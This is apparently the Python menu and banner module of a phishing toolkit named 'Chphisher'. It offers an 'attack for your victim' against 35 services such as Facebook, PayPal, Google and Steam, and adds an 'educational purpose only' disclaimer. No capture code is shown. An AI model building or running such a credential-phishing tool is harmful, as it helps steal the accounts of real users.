import time
import sys
import os
import platform
from colorama import Fore, init, Back
from modules.config import __version__
from modules.rainbow import colorize
init()

class AsciiArt:
    Logo = fr"""{Fore.CYAN}
   _____ _           _     _     _               
  / ____| |         | |   (_)   | |              
 | |    | |__  _ __ | |__  _ ___| |__   ___ _ __ 
 | |    | '_ \| '_ \| '_ \| / __| '_ \ / _ \ '__|
 | |____| | | | |_) | | | | \__ \ | | |  __/ |   
  \_____|_| |_| .__/|_| |_|_|___/_| |_|\___|_|   
              | |                                
              |_|               {Fore.LIGHTRED_EX}Version : {__version__}

{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Tool Created By Ch4120N (AmirHossein.Ghanmi)
    """
#     Logo = fr"""
#    _____ _           _     _     _               
#   / ____| |         | |   (_)   | |              
#  | |    | |__  _ __ | |__  _ ___| |__   ___ _ __ 
#  | |    | '_ \| '_ \| '_ \| / __| '_ \ / _ \ '__|
#  | |____| | | | |_) | | | | \__ \ | | |  __/ |   
#   \_____|_| |_| .__/|_| |_|_|___/_| |_|\___|_|   
#               | |                                
#               |_|               Version : {__version__}

# [+] Tool Created By Ch4120N (AmirHossein.Ghanmi)

#     """
    Logo_v2 = fr"""{Fore.BLUE}
       (       )            )            )            
       )\   ( /(         ( /( (       ( /(    (   (   
     (((_)  )\()) `  )   )\()))\  (   )\())  ))\  )(  
     )\___ ((_)\  /(/(  ((_)\((_) )\ ((_)\  /((_)(()\ 
    ((/ __|| |(_)((_)_\ | |(_)(_)((_)| |(_)(_))   ((_)
     | (__ | ' \ | '_ \)| ' \ | |(_-<| ' \ / -_) | '_|
      \___||_||_|| .__/ |_||_||_|/__/|_||_|\___| |_|  
                 |_|                                 {Fore.LIGHTWHITE_EX} {__version__}
    """
    # Logo_v2 = fr"""
    #    (       )            )            )            
    #    )\   ( /(         ( /( (       ( /(    (   (   
    #  (((_)  )\()) `  )   )\()))\  (   )\())  ))\  )(  
    #  )\___ ((_)\  /(/(  ((_)\((_) )\ ((_)\  /((_)(()\ 
    # ((/ __|| |(_)((_)_\ | |(_)(_)((_)| |(_)(_))   ((_)
    #  | (__ | ' \ | '_ \)| ' \ | |(_-<| ' \ / -_) | '_|
    #   \___||_||_|| .__/ |_||_||_|/__/|_||_|\___| |_|  
    #              |_|                                  {__version__}
    # """


class Menu:
    @staticmethod
    def about():
        """About Of Developer"""
        print("")
        print(f"""{Back.MAGENTA}
            {Fore.LIGHTGREEN_EX} Author   {Fore.LIGHTRED_EX}:  {Fore.LIGHTYELLOW_EX}AmirHossein Ghanmi {Fore.LIGHTRED_EX}[ {Fore.LIGHTYELLOW_EX}Ch4120N {Fore.LIGHTRED_EX}]   
            {Fore.LIGHTGREEN_EX} Github   {Fore.LIGHTRED_EX}:  {Fore.LIGHTCYAN_EX}https://github.com/Ch4120N       
            {Fore.LIGHTGREEN_EX} Social   {Fore.LIGHTRED_EX}:  {Fore.LIGHTCYAN_EX}https://t.me/Ch4120N             
            {Fore.LIGHTGREEN_EX} Version  {Fore.LIGHTRED_EX}:  {Fore.LIGHTYELLOW_EX}{__version__}                            {Back.RESET}

{Back.RED}            {Fore.LIGHTWHITE_EX}Warning:                                      {Back.RESET}
{Back.RED}            {Fore.LIGHTCYAN_EX}This Tool is made for educational purpose     {Back.RESET}
{Back.RED}            only {Fore.LIGHTYELLOW_EX}!{Back.RED}{Fore.LIGHTCYAN_EX} Author will not be responsible for     {Back.RESET}
{Back.RED}            any misuse of this toolkit {Fore.LIGHTYELLOW_EX}!                  {Back.RESET}

            {Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}00{Fore.LIGHTRED_EX}]{Fore.LIGHTYELLOW_EX} Main Menu     {Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}99{Fore.LIGHTRED_EX}]{Fore.LIGHTYELLOW_EX} Exit
        """)

    @staticmethod
    def main_menu():
        # print(AsciiArt.Logo)
        print(f"""
{Fore.LIGHTBLUE_EX}[{Fore.WHITE}*{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} There Is No Such Thing As Security {Fore.LIGHTBLUE_EX}[{Fore.WHITE}*{Fore.LIGHTBLUE_EX}]
{Fore.LIGHTBLUE_EX}[{Fore.WHITE}::{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Select An Attack For Your Victim {Fore.LIGHTBLUE_EX}[{Fore.WHITE}::{Fore.LIGHTBLUE_EX}]{Fore.YELLOW}

{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}01{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Facebook      {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}11{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Twitch       {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}21{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} DeviantArt
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}02{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Instagram     {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}12{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Pinterest    {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}22{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Badoo
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}03{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Google        {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}13{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Snapchat     {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}23{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Origin
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}04{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Microsoft     {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}14{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Linkedin     {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}24{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} DropBox
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}05{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Netflix       {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}15{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Ebay         {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}25{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Yahoo
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}06{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Paypal        {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}16{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Quora        {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}26{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Wordpress
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}07{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Steam         {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}17{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Protonmail   {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}27{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Yandex
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}08{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Twitter       {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}18{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Spotify      {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}28{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} StackoverFlow
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}09{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Playstation   {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}19{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Reddit       {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}29{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Vk
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}10{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Tiktok        {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}20{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Adobe        {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}30{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} XBOX
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}31{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Mediafire     {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}32{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Gitlab       {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}33{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Github
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}34{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Discord       {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}35{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Roblox

{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}99{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} About         {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}00{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Exit
        """)
#         print(colorize.Horizontal("""
# [*] There Is No Such Thing As Security [*]
# [::] Select An Attack For Your Victim [::]

# [01] Facebook      [11] Twitch       [21] DeviantArt
# [02] Instagram     [12] Pinterest    [22] Badoo
# [03] Google        [13] Snapchat     [23] Origin
# [04] Microsoft     [14] Linkedin     [24] DropBox
# [05] Netflix       [15] Ebay         [25] Yahoo
# [06] Paypal        [16] Quora        [26] Wordpress
# [07] Steam         [17] Protonmail   [27] Yandex
# [08] Twitter       [18] Spotify      [28] StackoverFlow
# [09] Playstation   [19] Reddit       [29] Vk
# [10] Tiktok        [20] Adobe        [30] XBOX
# [31] Mediafire     [32] Gitlab       [33] Github
# [34] Discord       [35] Roblox

# [99] About         [00] Exit
# """))
        
